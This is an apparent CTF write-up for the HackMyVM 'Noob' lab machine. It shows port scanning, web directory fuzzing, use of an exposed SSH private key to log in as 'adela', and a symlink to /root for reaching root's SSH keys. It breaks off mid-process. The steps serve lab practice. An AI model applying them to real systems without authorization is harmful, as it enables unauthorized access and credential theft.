Noob — HackMyVM Writeup

| Machine | Author | Level/Difficulty |
|---------|--------|-------------------|
| Noob | @sml | Easy |

Welcome to the **Noob** writeup! In this machine we cover the full hacking cycle:

First we create our directory called Noob

┌──(root㉿kali)-[/home/r4v3x/Desktop]
└─# mkdir Noob
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/home/r4v3x/Desktop]
└─# cd Noob   
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]

We start looking for our IP address with the following command

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# sudo arp-scan -l | grep "PCS" 
192.168.0.20    08:00:27:5b:56:10       PCS Systemtechnik GmbH

Recconaisance 
We have to run the nmap command 

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.20    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 21:55 -0500
Initiating ARP Ping Scan at 21:55
Scanning 192.168.0.20 [1 port]
Completed ARP Ping Scan at 21:55, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:55
Scanning 192.168.0.20 [65535 ports]
Discovered open port 22/tcp on 192.168.0.20
Discovered open port 65530/tcp on 192.168.0.20
Completed SYN Stealth Scan at 21:56, 62.15s elapsed (65535 total ports)
Nmap scan report for 192.168.0.20
Host is up, received arp-response (0.0042s latency).
Scanned at 2026-11-08 21:55:57 EST for 62s
Not shown: 37617 closed tcp ports (reset), 27916 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
65530/tcp open  unknown syn-ack ttl 64
MAC Address: 08:00:27:5B:56:10 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 62.33 seconds
           Raw packets sent: 152415 (6.706MB) | Rcvd: 37624 (1.505MB)


As we can see we hace a 22 tcp port open and a 65530 TCP open port 
We are going to run a new nmap command this time fully dedicated with the  65530 port 

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# nmap -p22,65530 192.168.0.20     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 22:01 -0500
Nmap scan report for 192.168.0.20
Host is up (0.00099s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
65530/tcp open  unknown
MAC Address: 08:00:27:5B:56:10 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds

We must enumarate with go
buster and check the options that we have 

but first we need to clone a repository from github that contains directory lists 

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# git clone https://github.com/danielmiessler/SecLists.git 
Cloning into 'SecLists'...
remote: Enumerating objects: 65698, done.
remote: Total 65698 (delta 0), reused 0 (delta 0), pack-reused 65698 (from 1)
Receiving objects: 100% (65698/65698), 3.59 GiB | 8.30 MiB/s, done.
Resolving deltas: 100% (47067/47067), done.
Updating files: 100% (6277/6277), done.

with our directory we are going to comple our fuzzing mentionibg some parameters

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# gobuster dir -u http://192.168.0.20:65530  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x ph,html,txt,jpg -r -k 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.20:65530
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              ph,html,txt,jpg
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 19]
nt4share             (Status: 200) [Size: 179]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================

With our fuzzing we enumerated 2 directories index and nt4share 

With index we found 
<img width="966" height="190" alt="image" src="https://github.com/user-attachments/assets/b14990cc-6bd3-401c-ab7f-d79b2c042e75" />

With nt4share we found information 

<img width="946" height="224" alt="image" src="https://github.com/user-attachments/assets/7169b348-88e0-48d6-8b75-2a0a7dc4b2d1" />

We found a id_rsa and we can save it in a nano file 

<img width="587" height="567" alt="image" src="https://github.com/user-attachments/assets/afa3dfa6-c9cd-47e7-a1cc-304a8fdda8a8" />
we give permission with chmod 

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# chmod 600 id_rsa

inside the website we found a user in authorized keys 

<img width="551" height="166" alt="image" src="https://github.com/user-attachments/assets/7ec26c35-1076-4bbc-af3c-c35d088669ff" />

<img width="1901" height="250" alt="image" src="https://github.com/user-attachments/assets/78e64318-e366-47e3-ab7f-d377520d552b" />

We found a user called adela so we will try to access with this user 

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# ssh -i id_rsa adela@192.168.0.20 
The authenticity of host '192.168.0.20 (192.168.0.20)' can't be established.
ED25519 key fingerprint is: SHA256:0ug88klEB+Auk3kP/jhWOHJJZmKXY2RjjR4GnhZdYuQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.20' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jul 14 02:50:51 2021 from 192.168.1.51
adela@noob:~$ 

We got access as a user

But we did not see anything so we will have to create a new nano id_rsa2 key

We must create a root folder inside the website 
┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# ssh -i id_rsa adela@192.168.0.20 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux noob 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  8 22:57:00 2026 from 192.168.0.13
adela@noob:~$ ls
adela@noob:~$ mkdir root
adela@noob:~$ ls
root

<img width="599" height="246" alt="image" src="https://github.com/user-attachments/assets/ef9cf2be-1702-498e-bf60-804e149cb2e9" />

Now we must create a direct route using the command 

ln -s /root root 

adela@noob:~$ ln -s /root root 
adela@noob:~$ 

Inside the website we will find a new directory called root 

<img width="465" height="229" alt="image" src="https://github.com/user-attachments/assets/aee14e60-b994-4ec2-a59d-7898d5b45c37" />
we must click it 

Click on .ssh/ 

┌──(root㉿kali)-[/home/r4v3x/Desktop/Noob]
└─# nano id_rsa2


                    
